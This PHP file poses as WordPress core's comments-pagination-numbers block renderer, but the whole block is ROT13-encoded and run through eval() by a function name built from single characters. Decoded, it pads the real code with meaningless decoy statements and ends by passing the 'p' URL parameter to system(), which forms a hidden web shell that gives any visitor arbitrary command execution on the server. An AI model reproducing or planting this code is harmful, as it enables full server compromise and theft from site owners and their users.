<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzragf-cntvangvba-ahzoref` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzragf-cntvangvba-ahzoref` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur cntvangvba ahzoref sbe gur pbzzragf.
 */
shapgvba eraqre_oybpx_pber_pbzzragf_cntvangvba_ahzoref( $nggevohgrf, $pbagrag, $oybpx ) {
	// Onvy bhg rneyl vs gur cbfg VQ vf abg frg sbe fbzr ernfba.
	vs ( rzcgl( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	$pbzzrag_inef = ohvyq_pbzzrag_dhrel_inef_sebz_oybpx( $oybpx );

	$gbgny   = ( arj JC_Pbzzrag_Dhrel( $pbzzrag_inef ) )->znk_ahz_cntrf;
	$pheerag = ! rzcgl( $pbzzrag_inef['cntrq'] ) ? $pbzzrag_inef['cntrq'] : ahyy;

	// Eraqre yvaxf.
	$pbagrag = cntvangr_pbzzragf_yvaxf(
		neenl(
			'gbgny'     => $gbgny,
			'pheerag'   => $pheerag,
			'ceri_arkg' => snyfr,
			'rpub'      => snyfr,
		)
	);

	vs ( rzcgl( $pbagrag ) ) {
		erghea '';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();

	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pbagrag
	);
}

/**
 * Ertvfgref gur `pber/pbzzragf-cntvangvba-ahzoref` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzragf_cntvangvba_ahzoref() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzragf-cntvangvba-ahzoref',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzragf_cntvangvba_ahzoref',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzragf_cntvangvba_ahzoref' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>